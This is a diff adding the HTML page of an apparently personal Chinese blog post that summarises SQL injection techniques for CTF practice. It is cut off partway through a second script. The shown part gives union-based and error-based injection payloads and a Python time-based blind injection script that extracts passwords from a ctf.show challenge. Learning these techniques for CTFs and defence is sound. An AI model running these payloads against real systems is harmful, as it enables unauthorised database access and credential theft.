@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言休学在家的时候就接触了SQL注入，但是一直学的不够扎实和系统，复学后遇到关于SQL注入的题往往还是不敢下手。SQL注入比较杂是一方面，另一方面是缺乏系统的梳理。今天在这里把常见的梳理一下，主要是整理一下常见的攻击方式，具体原理层的东西大家可以百度了解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入">
+<meta property="og:url" content="http://example.com/2021/04/28/Sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言休学在家的时候就接触了SQL注入，但是一直学的不够扎实和系统，复学后遇到关于SQL注入的题往往还是不敢下手。SQL注入比较杂是一方面，另一方面是缺乏系统的梳理。今天在这里把常见的梳理一下，主要是整理一下常见的攻击方式，具体原理层的东西大家可以百度了解。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/04/28/5sDjPTCEzfuaqve.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/01/t5EmUVqJL94Qkzg.png">
+<meta property="article:published_time" content="2021-04-28T00:48:51.000Z">
+<meta property="article:modified_time" content="2024-09-08T03:55:21.678Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/28/5sDjPTCEzfuaqve.png">
+
+
+<link rel="canonical" href="http://example.com/2021/04/28/Sql%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/04/28/Sql%E6%B3%A8%E5%85%A5/","path":"2021/04/28/Sql注入/","title":"Sql注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Sql注入 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E6%A6%82"><span class="nav-number">1.1.</span> <span class="nav-text">总概</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E6%98%8E%E6%98%BE%E7%9A%84%E5%9B%9E%E6%98%BE"><span class="nav-number">1.2.1.</span> <span class="nav-text">有明显的回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml"><span class="nav-number">1.2.1.2.1.</span> <span class="nav-text">updatexml</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue"><span class="nav-number">1.2.1.2.2.</span> <span class="nav-text">extractvalue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">1.2.1.2.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99"><span class="nav-number">1.2.1.2.4.</span> <span class="nav-text">双查询报错</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B1%87%E6%80%BB"><span class="nav-number">1.2.1.2.5.</span> <span class="nav-text">汇总</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%98%8E%E6%98%BE%E5%9B%9E%E6%98%BE"><span class="nav-number">1.2.2.</span> <span class="nav-text">无明显回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%88%E7%8E%87%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">效率问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sleep"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">sleep</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#benchmark"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">benchmark</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="nav-number">1.2.2.2.3.</span> <span class="nav-text">笛卡尔积</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%88%99"><span class="nav-number">1.2.2.2.4.</span> <span class="nav-text">正则</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">其他盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.3.</span> <span class="nav-text">其他注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#limit%E4%B8%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">limit下注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.3.1.1.</span> <span class="nav-text">报错方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">1.2.3.1.2.</span> <span class="nav-text">时间盲注</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%93%E5%90%88%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-number">1.2.3.2.1.</span> <span class="nav-text">结合预处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%93%E5%90%88handler"><span class="nav-number">1.2.3.2.2.</span> <span class="nav-text">结合handler</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">增删改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">无列名注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-trick"><span class="nav-number">1.3.</span> <span class="nav-text">绕过&amp;trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">1.4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/28/Sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Sql注入 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Sql注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-28 08:48:51" itemprop="dateCreated datePublished" datetime="2021-04-28T08:48:51+08:00">2021-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 11:55:21" itemprop="dateModified" datetime="2024-09-08T11:55:21+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>休学在家的时候就接触了SQL注入，但是一直学的不够扎实和系统，复学后遇到关于SQL注入的题往往还是不敢下手。SQL注入比较杂是一方面，另一方面是缺乏系统的梳理。今天在这里把常见的梳理一下，主要是整理一下常见的攻击方式，具体原理层的东西大家可以百度了解。</p>
+<span id="more"></span>
+
+<h2 id="总概"><a href="#总概" class="headerlink" title="总概"></a>总概</h2><p>SQL注入是因为用户输入的数据被当成命令带进去而造成的，所以我们想要造成SQL注入，一直都是围绕着如何让我们用户输入的语句被解析成命令，同时也涉及到字符型，数字型等等，我们想办法去闭合原有的引号&#x2F;语句，造成参数逃逸，然后去构造攻击代码。</p>
+<p>关于SQL注入，从某一层面上来说，可以分为两大类：带数据库信息的回显和没有特别明显的回显（包括回显的信息不涉及到数据库，以及根本就无信息回显），接下来我们分别对这两个大类展开梳理。</p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="有明显的回显"><a href="#有明显的回显" class="headerlink" title="有明显的回显"></a>有明显的回显</h3><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>联合注入可以说是最早接触的一种注入，当时是打的sqli-lab靶场，这里不对具体原理累述，大家可以自行去查阅有关信息。联合注入的流程：</p>
+<ul>
+<li>查列数（order by)</li>
+<li>找回显位(union select 1,2,3,….)</li>
+<li>依次爆库，爆表，爆列，爆字段</li>
+</ul>
+<p>给一个demo吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf_web where id=&#x27;$id&#x27;; //假设给的大致语句是这样，并且有明显的带数据库信息的回显。</span><br><span class="line">?id=1&#x27;order by 1 #  //这里从1开始尝试，直到报错 ，注释符也可以换成 --+ </span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,3# //这里假设有三列，我们找到可以回显信息的位置</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#//爆表</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;# //爆列名</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(字段名) from 表名 # //爆值</span><br></pre></td></tr></table></figure>
+
+<p>然后基本上就是围绕着这个去过滤一些东西，想办法绕就好了，把过滤的一些技巧放在最后。</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入是利用报错来把我们查询的信息进行外带。这里有几种常见的报错注入方式</p>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>?id=&#39;or and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></p>
+<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>?id=&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p><code>?id=4&#39; and Exp(~(select * from (select version())a))#</code></p>
+<p>对版本有限制</p>
+<h5 id="双查询报错"><a href="#双查询报错" class="headerlink" title="双查询报错"></a>双查询报错</h5><p><code>?id=-1&#39; union select 1,count(*),concat((select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e,floor(rand()*2))a from information_schema.columns group by a #</code></p>
+<p>当这里的 向上取整函数 floor 被禁止时，可以换成 ceil 、round，这两个函数的效果是一样的。</p>
+<h5 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h5><p>参考feng师傅的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> floor + rand + group by</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat(version(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a);</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> (select count(*) <span class="keyword">from</span> (select <span class="number">1</span> union select null union select  !<span class="number">1</span>)x group by concat((select table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (select table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(select user())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Name_Const(&gt;<span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line">select * <span class="keyword">from</span> (select NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> Join</span><br><span class="line">select * <span class="keyword">from</span>(select * <span class="keyword">from</span> mysql.user a join mysql.user b)c;</span><br><span class="line">select * <span class="keyword">from</span>(select * <span class="keyword">from</span> mysql.user a join mysql.user b using(Host))c;</span><br><span class="line">select * <span class="keyword">from</span>(select * <span class="keyword">from</span> mysql.user a join mysql.user b using(Host,User))c;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> exp()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> Exp(~(select * <span class="keyword">from</span> (select version())a));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> geometrycollection()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> multipoint()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> polygon()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> multipolygon()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span> linestring()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span> multilinestring()//mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line">select * <span class="keyword">from</span> user where <span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<h3 id="无明显回显"><a href="#无明显回显" class="headerlink" title="无明显回显"></a>无明显回显</h3><p>之前被HVV面试问到盲注的含义和什么时候用盲注的时候，当时自己回答的是逻辑1和逻辑0出现了不同的回显，来作为条件，其实还是基于给了信息，但是如果一点儿信息都不给呢，这里就得用到时间盲注。这里把时间盲注单独来说，是因为它自己就构成了一个判断条件。盲注的本质就是去找到不同的回显条件，不管你通过什么方式和语句，你拿到不同的回显条件，你就可以盲注了。</p>
+<h4 id="效率问题"><a href="#效率问题" class="headerlink" title="效率问题"></a>效率问题</h4><p>盲注的时候，效率是挺重要的，选择不同的字典和算法可以导致效率很大差别。有时候算法太慢，一个容器的时间用完了都没注出来23333，一种是直接按照字典顺序来爆破，复杂度是o(n²)  另外一种就是二分法，这个时间复杂度为o(nlogn)</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>没有明显的回显的时候，这个时候只能利用时间作为一个判断条件，这个时候，时间盲注就显得十分重要了。</p>
+<p>关于时间盲注，贴一篇文章 <code>https://xz.aliyun.com/t/5505)</code>   ，总结了几个常见的时间盲注。</p>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><p>&#x2F;&#x2F;贴一个最常见的时间二分盲注的脚本，用到了 sleep</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eaa97f90-cc20-4528-948c-714fbc3652b6.challenge.ctf.show:8080/api/v5.php?id=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#爆破database()</span></span><br><span class="line">        <span class="comment">#payload=f&#x27; if( ascii( substr((select database()),&#123;i&#125;,1) )&gt;&#123;mid&#125;,sleep(3),1 ) --+ &#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆破table</span></span><br><span class="line">        <span class="comment">#payload=f&#x27; if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow_web&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1) --+&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆破字段名</span></span><br><span class="line">        <span class="comment">#payload=f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_user5&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1) --+&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆值</span></span><br><span class="line">        payload = <span class="string">f&#x27;if( ascii(substr( (select  password from ctfshow_user5 limit 24,1) ,<span class="subst">&#123;i&#125;</span>,1) )&gt; <span class="subst">&#123;mid&#125;</span> , sleep(3) , 1) --+&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">1</span>)</span><br><span class="line">            tail=mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h5><p>但，如果sleep被禁了呢？这个时候可以换上 benchmark 效果是一样的，把 sleep(3) 那里换一下 benchmark(10000,sha(1)) ，但是benchmark执行受服务器那边影响，有时候执行时间会有波动和误差，贴上一个优化的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span 